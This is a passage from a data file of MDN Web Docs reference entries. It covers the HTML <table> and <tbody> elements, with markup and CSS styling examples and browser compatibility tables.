column for a \"Membership End Date\" is added in each body row with the [`<td>`](td) element. An additional row ([`<tr>`](tr) element) is also added within the head section ([`<thead>`](thead) element) to introduce a \"Membership Dates\" header as a heading for the \"Joined\" and \"Canceled\" columns.\n\nThe creation of the second header row involves adding [`colspan`](th#colspan) and [`rowspan`](th#rowspan) attributes to the [`<th>`](th) elements to allocate the header cells to the correct columns and rows.\n\nhtml\n\n```\n<table>\n  <thead>\n    <tr>\n      <th scope=\"col\" rowspan=\"2\">Name</th>\n      <th scope=\"col\" rowspan=\"2\">ID</th>\n      <th scope=\"col\" colspan=\"2\">Membership Dates</th>\n      <th scope=\"col\" rowspan=\"2\">Balance</th>\n    </tr>\n    <tr>\n      <th scope=\"col\">Joined</th>\n      <th scope=\"col\">Canceled</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th scope=\"row\">Margaret Nguyen</th>\n      <td>427311</td>\n      <td><time datetime=\"2010-06-03\">June 3, 2010</time></td>\n      <td>n/a</td>\n      <td>0.00</td>\n    </tr>\n    <tr>\n      <th scope=\"row\">Edvard Galinski</th>\n      <td>533175</td>\n      <td><time datetime=\"2011-01-13\">January 13, 2011</time></td>\n      <td><time datetime=\"2017-04-08\">April 8, 2017</time></td>\n      <td>37.00</td>\n    </tr>\n    <tr>\n      <th scope=\"row\">Hoshi Nakamura</th>\n      <td>601942</td>\n      <td><time datetime=\"2012-07-23\">July 23, 2012</time></td>\n      <td>n/a</td>\n      <td>15.00</td>\n    </tr>\n  </tbody>\n</table>\n```\n\n#### Result\n\nThe head section now has two rows, one with the headers ([`<th>`](th) elements) \"Name\", \"ID\", \"Membership Dates\", and \"Balance\", and a \"Membership Dates\" header with two subheaders that are in a second row: \"Joined\" and \"Canceled\". This is accomplished by:\n\n- The first row's \"Name\", \"ID\", and \"Balance\" header cells span both table header rows by using the [`rowspan`](th#rowspan) attribute, making them each two rows tall.\n- The first row's \"Membership Dates\" header cell spans two columns using the [`colspan`](th#colspan) attribute, causing it to be two columns wide.\n- The second row contains only the two header cells \"Joined\" and \"Canceled\" because the other three columns are merged with the cells in the first row that span two rows. The two header cells are correctly positioned under the \"Membership Dates\" header.\n\n### Table caption and column summary\n\nIt's a common and advisable practice to provide a summary for the table's content, allowing users to quickly determine the table's relevance. Furthermore, the \"Balance\" column is summarized by displaying the sum of the balances of the individual members.\n\n#### HTML\n\nA table summary is added by using a table [caption](#captions) ([`<caption>`](caption) element) as the first child element of the `<table>`. The caption provides the [accessible description](https://developer.mozilla.org/en-US/docs/Glossary/Accessible_description) for the table.\n\nLastly, a table foot section ([`<tfoot>`](tfoot) element) is added below the body, with a row that summarizes the \"Balance\" column by displaying a sum. The elements and attributes introduced earlier are applied.\n\nhtml\n\n```\n<table>\n  <caption>\n    Status of the club members 2021\n  </caption>\n  <thead>\n    <tr>\n      <th scope=\"col\" rowspan=\"2\">Name</th>\n      <th scope=\"col\" rowspan=\"2\">ID</th>\n      <th scope=\"col\" colspan=\"2\">Membership Dates</th>\n      <th scope=\"col\" rowspan=\"2\">Balance</th>\n    </tr>\n    <tr>\n      <th scope=\"col\">Joined</th>\n      <th scope=\"col\">Canceled</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th scope=\"row\">Margaret Nguyen</th>\n      <td>427311</td>\n      <td><time datetime=\"2010-06-03\">June 3, 2010</time></td>\n      <td>n/a</td>\n      <td>0.00</td>\n    </tr>\n    <tr>\n      <th scope=\"row\">Edvard Galinski</th>\n      <td>533175</td>\n      <td><time datetime=\"2011-01-13\">January 13, 2011</time></td>\n      <td><time datetime=\"2017-04-08\">April 8, 2017</time></td>\n      <td>37.00</td>\n    </tr>\n    <tr>\n      <th scope=\"row\">Hoshi Nakamura</th>\n      <td>601942</td>\n      <td><time datetime=\"2012-07-23\">July 23, 2012</time></td>\n      <td>n/a</td>\n      <td>15.00</td>\n    </tr>\n  </tbody>\n  <tfoot>\n    <tr>\n      <th scope=\"row\" colspan=\"4\">Total balance</th>\n      <td>52.00</td>\n    </tr>\n  </tfoot>\n</table>\n```\n\n#### Result\n\n### Basic table styling\n\nLet's apply a basic style to the table to adjust the typeface and add a [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) to the head and foot rows. The HTML is unchanged this time, so let's dive right into the CSS.\n\n#### CSS\n\nWhile a [`font`](https://developer.mozilla.org/en-US/docs/Web/CSS/font) property is added to the `<table>` element here to set a more visually appealing typeface (or an abominable sans-serif typeface, depending on your personal opinion), the interesting part is the second style, where the [`<tr>`](tr) elements located within the [`<thead>`](thead) and [`<tfoot>`](tfoot) are styled adding a light blue [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color). This is a way to quickly apply a background color to all the cells in specific sections simultaneously.\n\ncss\n\n```\ntable {\n  border: 2px solid rgb(140 140 140);\n  font:\n    16px \"Open Sans\",\n    Helvetica,\n    Arial,\n    sans-serif;\n}\n\nthead > tr,\ntfoot > tr {\n  background-color: rgb(228 240 245);\n}\n\nth,\ntd {\n  border: 1px solid rgb(160 160 160);\n}\n```\n\n#### Result\n\n### Advanced table styling\n\nNow we'll go all-out, with styles on rows in the header and body areas both, including alternating row colors, cells with different colors depending on position within a row, and so forth. Let's take a look at the result first this time.\n\n#### Result\n\nHere's what the final table will look like:\n\nThere is no change to the HTML again. See what proper preparation of the HTML structure can do?\n\n#### CSS\n\nThe CSS is much more involved this time. It's not complicated, but there's a lot going on. Let's break it down.\n\nHere the [`border-collapse`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-collapse) and [`border-spacing`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-spacing) properties are added to eliminate spacing between cells and collapse borders that touch one another to be a single border instead of winding up with double borders. Additionally, the [`<caption>`](caption) is placed at the `bottom` of the table using the [`caption-side`](https://developer.mozilla.org/en-US/docs/Web/CSS/caption-side) property:\n\ncss\n\n```\ntable {\n  border-collapse: collapse;\n  border-spacing: 0;\n  border: 2px solid rgb(140 140 140);\n  font:\n    16px \"Open Sans\",\n    Helvetica,\n    Arial,\n    sans-serif;\n}\n\ncaption {\n  caption-side: bottom;\n  padding: 10px;\n  font-weight: bold;\n}\n```\n\nNext, the [`padding`](https://developer.mozilla.org/en-US/docs/Web/CSS/padding) property is used to give all the table cells space around their content. The [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align) property aligns the content of the header cells to the `bottom` of the cell, which can be seen on the cells in the head that span two rows:\n\ncss\n\n```\nth,\ntd {\n  border: 1px solid rgb(160 160 160);\n  padding: 4px 6px;\n}\n\nth {\n  vertical-align: bottom;\n}\n```\n\nThe next CSS rule sets the [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) of all [`<tr>`](tr) elements in the table's head (as specified using [`<thead>`](thead)). Then the bottom border of the head is set to be a two-pixel wide line. Notice, however, that we're using the [`:nth-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-of-type) selector to apply the [`border-bottom`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-bottom) property to the *second* row in the head. Why? Because the head is made of two rows that are spanned by some of the cells. That means there are actually two rows there; applying the style to the first row would not give us the expected result:\n\ncss\n\n```\nthead > tr {\n  background-color: rgb(228 240 245);\n}\n\nthead > tr:nth-of-type(2) {\n  border-bottom: 2px solid rgb(140 140 140);\n}\n```\n\nLet's style the two header cells \"Joined\" and \"Canceled\" with green and red hues to represent the \"good\" of a new member and the \"bummer\" of a canceled membership. Here we dig into the last row of the table's head section using the [`:last-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:last-of-type) selector and give the first header cell in it (the \"Joined\" header) a greenish color, and the second header cell in it (the \"Canceled\" header) a reddish hue:\n\ncss\n\n```\nthead > tr:last-of-type > th:nth-of-type(1) {\n  background-color: rgb(225 255 225);\n}\n\nthead > tr:last-of-type > th:nth-of-type(2) {\n  background-color: rgb(255 225 225);\n}\n```\n\nSince the first column should stand out as well, some custom styling is added here too. This CSS rule styles the first header cell in each row of the table's body with the [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align) property to left-justify the member names, and with a somewhat different [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color):\n\ncss\n\n```\ntbody > tr > th:first-of-type {\n  text-align: left;\n  background-color: rgb(225 229 244);\n}\n```\n\nIt's common to help improve the readability of table data by alternating row colors—this is sometimes referred to as \"zebra striping\". Let's add a bit of [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) to every even row:\n\ncss\n\n```\ntbody > tr:nth-of-type(even) {\n  background-color: rgb(237 238 242);\n}\n```\n\nSince it's standard practice to right-justify currency values in tables, let's do that here. This just sets the [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align) property for the last [`<td>`](td) in each body row to `right`:\n\ncss\n\n```\ntbody > tr > td:last-of-type {\n  text-align: right;\n}\n```\n\nFinally, some styling similar to the head is applied to the foot section of the table to make it stand out as well:\n\ncss\n\n```\ntfoot > tr {\n  border-top: 2px dashed rgb(140 140 140);\n  background-color: rgb(228 240 245);\n}\n\ntfoot th,\ntfoot td {\n  text-align: right;\n  font-weight: bold;\n}\n```\n\n### Displaying large tables in small spaces\n\nA common issue with tables on the web is that they don't natively work very well on small screens when the amount of content is large, and the way to make them scrollable isn't obvious, especially when the markup may come from a CMS and cannot be modified to have a wrapper.\n\nThis example provides one way to display tables in small spaces. We've hidden the HTML content as it is very large, and there is nothing remarkable about it. The CSS is more useful to inspect in this example.\n\n#### CSS\n\nWhen looking at these styles you'll notice that table's [`display`](https://developer.mozilla.org/en-US/docs/Web/CSS/display) property has been set to `block`. While this allows scrolling, the table loses some of its integrity, and table cells try to become as small as possible. To mitigate this issue we've set [`white-space`](https://developer.mozilla.org/en-US/docs/Web/CSS/white-space) to `nowrap` on the [`<tbody>`](tbody). However, we don't do this for the [`<thead>`](thead) to avoid long titles forcing columns to be wider than they need to be to display the data.\n\nTo keep the table headers on the page while scrolling down we've set [`position`](https://developer.mozilla.org/en-US/docs/Web/CSS/position) to sticky on the [`<th>`](th) elements. Note that we have **not** set [`border-collapse`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-collapse) to `collapse`, as if we do the header cannot be separated correctly from the rest of the table.\n\nGiven that the `<table>` has a fixed size, the [`overflow`](https://developer.mozilla.org/en-US/docs/Web/CSS/overflow) set to `auto` is the important part here, as it makes the table scrollable.\n\ncss\n\n```\ntable,\nth,\ntd {\n  border: 1px solid black;\n}\n\ntable {\n  overflow: auto;\n  width: 100%;\n  max-width: 400px;\n  height: 240px;\n  display: block;\n  margin: 0 auto;\n  border-spacing: 0;\n}\n\ntbody {\n  white-space: nowrap;\n}\n\nth,\ntd {\n  padding: 5px 10px;\n  border-top-width: 0;\n  border-left-width: 0;\n}\n\nth {\n  position: sticky;\n  top: 0;\n  background: #fff;\n  vertical-align: bottom;\n}\n\nth:last-child,\ntd:last-child {\n  border-right-width: 0;\n}\n\ntr:last-child td {\n  border-bottom-width: 0;\n}\n```\n\n#### Result\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|               | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|               | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `table`       | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `align`       | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `bgcolor`     | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `border`      | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `cellpadding` | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `cellspacing` | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `frame`       | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `rules`       | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `summary`     | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `width`       | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- [Learn: HTML tables](https://developer.mozilla.org/en-US/docs/Learn/HTML/Tables)\n- [`<caption>`](caption), [`<col>`](col), [`<colgroup>`](colgroup), [`<tbody>`](tbody), [`<td>`](td), [`<tfoot>`](tfoot), [`<th>`](th), [`<thead>`](thead), [`<tr>`](tr): Other table-related elements\n- [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color): CSS property to set the background color of the table\n- [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border), [`border-collapse`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-collapse), [`border-spacing`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-spacing): CSS properties to control the aspect of cell borders, rules, and frame\n- [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin), [`padding`](https://developer.mozilla.org/en-US/docs/Web/CSS/padding): CSS properties to align the table and set spacing on cell content\n- [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align): CSS property to horizontally align table cell content\n- [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align): CSS property to vertically align table cell content\n- [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width): CSS property to control the width of the table\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/table](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/table)"
- name: target (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`target`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/target)

    [`<a>`](element/a), [`<area>`](element/area), [`<base>`](element/base), [`<form>`](element/form)

    Specifies where to open the linked document (in the case of an `<a>` element) or where to display the response received (in the case of a `<form>` element)
- name: tbody
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<tbody\\>: The Table Body element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ftbody&level=high)\n\nThe `<tbody>` [HTML](../index) element encapsulates a set of table rows ([`<tr>`](tr) elements), indicating that they comprise the body of a table's (main) data.\n\n## Try it\n\n#### HTML Demo: \\<tbody\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <table>\n      <caption>\n        Council budget (in £) 2018\n      </caption>\n      <thead>\n        <tr>\n          <th scope=\"col\">Items</th>\n          <th scope=\"col\">Expenditure</th>\n        </tr>\n      </thead>\n      <tbody>\n        <tr>\n          <th scope=\"row\">Donuts</th>\n          <td>3,000</td>\n        </tr>\n        <tr>\n          <th scope=\"row\">Stationery</th>\n          <td>18,000</td>\n        </tr>\n      </tbody>\n      <tfoot>\n        <tr>\n          <th scope=\"row\">Totals</th>\n          <td>21,000</td>\n        </tr>\n      </tfoot>\n    </table>\n\n    thead,\n    tfoot {\n      background-color: #2c5e77;\n      color: #fff;\n    }\n\n    tbody {\n      background-color: #e4f0f5;\n    }\n\n    table {\n      border-collapse: collapse;\n      border: 2px solid rgb(140 140 140);\n      font-family: sans-serif;\n      font-size: 0.8rem;\n      letter-spacing: 1px;\n    }\n\n    caption {\n      caption-side: bottom;\n      padding: 10px;\n    }\n\n    th,\n    td {\n      border: 1px solid rgb(160 160 160);\n      padding: 8px 10px;\n    }\n\n    td {\n      text-align: center;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n### Deprecated attributes\n\nThe following attributes are deprecated and should not be used. They are documented below for reference when updating existing code and for historical interest only.\n\n[`align`](#align) Deprecated  \nSpecifies the horizontal alignment of each body cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `left`, `center`, `right`, `justify`, and `char`. When supported, the `char` value aligns the textual content on the character defined in the [`char`](#char) attribute and on offset defined by the [`charoff`](#charoff) attribute. Use the [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align) CSS property instead, as this attribute is deprecated.\n\n[`bgcolor`](#bgcolor) Deprecated  \nDefines the background color of each body cell. The value is an HTML color; either a [6-digit hexadecimal RGB code](https://developer.mozilla.org/en-US/docs/Web/CSS/hex-color), prefixed by a '`#`', or a [color keyword](https://developer.mozilla.org/en-US/docs/Web/CSS/named-color). Other CSS [`<color>`](https://developer.mozilla.org/en-US/docs/Web/CSS/color_value) values are not supported. Use the [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) CSS property instead, as this attribute is deprecated.\n\n[`char`](#char) Deprecated  \nSpecifies the alignment of the content to a character of each body cell. Typical values for this include a period (`.`) when attempting to align numbers or monetary values. If [`align`](#align) is not set to `char`, this attribute is ignored.\n\n[`charoff`](#charoff) Deprecated  \nSpecifies the number of characters to offset the body cell content from the alignment character specified by the [`char`](#char) attribute.\n\n[`valign`](#valign) Deprecated  \nSpecifies the vertical alignment of each body cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `baseline`, `bottom`, `middle`, and `top`. Use the [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align) CSS property instead, as this attribute is deprecated.\n\n## Usage notes\n\n- The `<tbody>` is placed after any [`<caption>`](caption), [`<colgroup>`](colgroup), and [`<thead>`](thead) elements.\n- If [`<tr>`](tr) elements are specified as direct children of the [`<table>`](table) (see \"tag omission\" in the [technical summary](#technical_summary) for a description of when this is valid), then the markup generated by the browser will include a `<tbody>` element that encapsulates them. As a result, CSS selectors such as `table > tr` will not select these elements. See also the [Not specifying a body](#not_specifying_a_body) example.\n- It's permitted to use more than one `<tbody>` per table as long as they are all consecutive. This allows to divide the rows ([`<tr>`](tr) elements) in large tables into sections, each of which may be separately formatted if so desired. If not marked up to be consecutive elements, browsers will correct this author error, ensuring any [`<thead>`](thead) and [`<tfoot>`](tfoot) elements are rendered as the first and last elements of the table, respectively.\n- Along with its related [`<thead>`](thead) and [`<tfoot>`](tfoot) elements, the `<tbody>` element provides useful [semantic](https://developer.mozilla.org/en-US/docs/Glossary/Semantics) information and can be used when rendering for either screen or print. Specifying such table content groups also provides valuable contextual information for assistive technologies, including screen readers and search engines.\n- When printing a document, in the case of a multipage table, the [`<thead>`](thead) and [`<tfoot>`](tfoot) elements usually specify information that remains the same—or at least very similar—on each page, while the `<tbody>` element's contents generally will differ from page to page.\n- When a table is presented in a screen context (such as a window) that is not large enough to display the entire table, the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) may let the user scroll the contents of the [`<thead>`](thead), `<tbody>`, [`<tfoot>`](tfoot), and [`<caption>`](caption) blocks separately from one another for the same parent [`<table>`](table).\n\n## Examples\n\nSee [`<table>`](table) for a complete table example introducing common standards and best practices.\n\n### Not specifying a body\n\nThis example demonstrates that the browser automatically encapsulates [`<tr>`](tr) elements within a `<tbody>` element if the rows are not nested within a table grouping element (`<tbody>`, `<tfoot>`, or `<thead>`) and are, as in this example, the direct children of the [`<table>`](table) element.\n\n#### HTML\n\nHere, a very basic table with some table rows ([`<tr>`](tr) elements) containing data ([`<td>`](td) elements) about students is created.\n\nhtml\n\n```\n<table>\n  <tr>\n    <td>3741255</td>\n    <td>Jones, Martha</td>\n    <td>Computer Science</td>\n    <td>240</td>\n  </tr>\n  <tr>\n    <td>3971244</td>\n    <td>Nim, Victor</td>\n    <td>Russian Literature</td>\n    <td>220</td>\n  </tr>\n  <tr>\n    <td>4100332</td>\n    <td>Petrov, Alexandra</td>\n    <td>Astrophysics</td>\n    <td>260</td>\n  </tr>\n</table>\n```\n\n#### CSS\n\nNote the CSS in the example, where a [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) is specified for the `<tbody>` element and the `tbody` is used as a part of an additional [CSS selector](https://developer.mozilla.org/en-US/docs/Glossary/CSS_Selector). Alternatively, [browser developer tools](https://developer.mozilla.org/en-US/docs/Glossary/Developer_Tools) can be used to check the presence of the `<tbody>` element in the [DOM](https://developer.mozilla.org/en-US/docs/Glossary/DOM).\n\ncss\n\n```\ntbody {\n  background-color: #e4f0f5;\n}\n\ntbody > tr > td:last-of-type {\n  width: 60px;\n  text-align: center;\n}\n```\n\n#### Result\n\n### Basic body structure\n\nThis example extends and enhances the basic table from the [previous example](#not_specifying_a_body).\n\n#### HTML\n\nWe introduce a table head ([`<thead>`](thead) element) and explicitly use a `<tbody>` element to structure the table into [semantic](https://developer.mozilla.org/en-US/docs/Glossary/Semantics) sections. The table head contains the column headers ([`<th>`](th) elements). The `<tbody>` element represents the body section of the table, which contains a number of rows ([`<tr>`](tr) elements) with the table's main data, which is the data of each student.\n\nThe use of such table content groups and [semantic](https://developer.mozilla.org/en-US/docs/Glossary/Semantics) markup is not only useful for visual presentation (via CSS styling) and contextual information for assistive technologies; moreover, the explicit use of the `<tbody>` element helps the browser to create the intended table structure, avoiding unwanted results.\n\nhtml\n\n```\n<table>\n  <thead>\n    <tr>\n      <th>Student ID</th>\n      <th>Name</th>\n      <th>Major</th>\n      <th>Credits</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>3741255</td>\n      <td>Jones, Martha</td>\n      <td>Computer Science</td>\n      <td>240</td>\n    </tr>\n    <tr>\n      <td>3971244</td>\n      <td>Nim, Victor</td>\n      <td>Russian Literature</td>\n      <td>220</td>\n    </tr>\n    <tr>\n      <td>4100332</td>\n      <td>Petrov, Alexandra</td>\n      <td>Astrophysics</td>\n      <td>260</td>\n    </tr>\n  </tbody>\n</table>\n```\n\n#### CSS\n\nThe CSS is nearly unchanged from the [previous example](#not_specifying_a_body), except for some basic styling to highlight the table head so that the headers of the columns stand out from the data in the table body. As in the [example above](#not_specifying_a_body), the `tbody` [type selector](https://developer.mozilla.org/en-US/docs/Web/CSS/Type_selectors) is used to style the body cells.\n\ncss\n\n```\ntbody {\n  background-color: #e4f0f5;\n}\n\ntbody > tr > td:last-of-type {\n  text-align: center;\n}\n\nthead {\n  border-bottom: 2px solid rgb(160 160 160);\n  background-color: #2c5e77;\n  color: #fff;\n}\n```\n\n#### Result\n\n### Multiple bodies\n\nThis example extends and enhances the table from the [example above](#basic_body_structure) even more by introducing multiple body sections.\n\nUsing multiple `<tbody>` elements allows creating row groupings within a table. Each table body can potentially have its own head row or rows; however, *there may only be one [`<thead>`](thead) element per table*! Because of that, [`<tr>`](tr) with [`<th>`](th) elements can be used to create headers within each `<tbody>`.\n\n#### HTML\n\nBuilding on the table in the [previous basic example](#basic_body_structure), more students are added and, instead of listing each student's major on each row, the students are grouped by major. Note that each major is enclosed within its own `<tbody>` block, with the first row ([`<tr>`](tr) element) serving as the head of the block, displaying the major title within a [`<th>`](th) element that uses the [`colspan`](th#colspan) attribute to span the header across all three columns of the table. Each remaining row within each major's `<tbody>` represents one student.\n\nhtml\n\n```\n<table>\n  <thead>\n    <tr>\n      <th>Student ID</th>\n      <th>Name</th>\n      <th>Credits</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th colspan=\"3\">Computer Science</th>\n    </tr>\n    <tr>\n      <td>3741255</td>\n      <td>Jones, Martha</td>\n      <td>240</td>\n    </tr>\n    <tr>\n      <td>4077830</td>\n      <td>Pierce, Benjamin</td>\n      <td>200</td>\n    </tr>\n    <tr>\n      <td>5151701</td>\n      <td>Kirk, James</td>\n      <td>230</td>\n    </tr>\n  </tbody>\n  <tbody>\n    <tr>\n      <th colspan=\"3\">Russian Literature</th>\n    </tr>\n    <tr>\n      <td>3971244</td>\n      <td>Nim, Victor</td>\n      <td>220</td>\n    </tr>\n  </tbody>\n  <tbody>\n    <tr>\n      <th colspan=\"3\">Astrophysics</th>\n    </tr>\n    <tr>\n      <td>4100332</td>\n      <td>Petrov, Alexandra</td>\n      <td>260</td>\n    </tr>\n    <tr>\n      <td>8892377</td>\n      <td>Toyota, Hiroko</td>\n      <td>240</td>\n    </tr>\n  </tbody>\n</table>\n```\n\n#### CSS\n\nMost of the CSS is unchanged. However, a slightly more subtle style is added for header cells contained directly within a `<tbody>` (as opposed to those that reside in the [`<thead>`](thead)). This is used for the headers indicating each table section's corresponding major.\n\ncss\n\n```\ntbody > tr > th {\n  border-top: 2px solid rgb(160 160 160);\n  border-bottom: 1px solid rgb(140 140 140);\n  background-color: #e4f0f5;\n  font-weight: normal;\n}\n\ntbody {\n  background-color: whitesmoke;\n}\n\nthead {\n  background-color: #2c5e77;\n  color: #fff;\n}\n```\n\n#### Result\n\n## Technical summary\n\n|                                             ||\n|---------------------------------------------||\n| [Content categories](../content_categories) | None|\n| Permitted content                           | Zero or more [`<tr>`](tr) elements.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |\n| Tag omission                                | A `<tbody>` element's start tag can be omitted if the first thing inside the `<tbody>` element is a [`<tr>`](tr) element, and if the element is not immediately preceded by a `<tbody>`, [`<thead>`](thead), or [`<tfoot>`](tfoot) element whose end tag has been omitted. (It can't be omitted if the element is empty.) A `<tbody>` element's end tag can be omitted if the `<tbody>` element is immediately followed by a `<tbody>` or [`<tfoot>`](tfoot) element, or if there is no more content in the parent element. |\n| Permitted parents                           | Within the required parent [`<table>`](table) element, the `<tbody>` element can be added after any [`<caption>`](caption), [`<colgroup>`](colgroup), and [`<thead>`](thead) elements.                                                                                                                                                                                                                                                                                                                                      |\n| Implicit ARIA role                          | [`rowgroup`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/rowgroup_role)                                                                                                                                                                                                                                                                                                                                                                                                                           |\n| Permitted ARIA roles                        | Any|\n| DOM interface                               | [`HTMLTableSectionElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTableSectionElement)                                                                                                                                                                                                                                                                                                                                                                                                                       |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `tbody`   | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `align`   | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `bgcolor` | 1       | 12   | 1       | ≤15   | 1      | 18             | 4                   | ≤14           | 1             | 1.0              | 4.4             |     |\n| `char`    | 1       | 12   | No      | 15    | ≤4     | 18             | No                  | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `charoff` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `valign`  | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n## See also\n\n- [Learn: HTML tables](https://developer.mozilla.org/en-US/docs/Learn/HTML/Tables)\n- [`<caption>`](caption), [`<col>`](col), [`<colgroup>`](colgroup), [`<table>`](table), [`<td>`](td), [`<tfoot>`](tfoot), [`<th>`](th), [`<thead>`](thead), [`<tr>`](tr): Other table-related elements\n- [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color): CSS property to set the background color of each body cell\n- [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border): CSS property to control borders of body cells\n- [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align): CSS property to horizontally align each body cell content\n- [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align): CSS property to vertically align each body cell content\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/tbody](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/tbody)"
- name: td
  summary: This feature is well established and works across many devices and browser versions
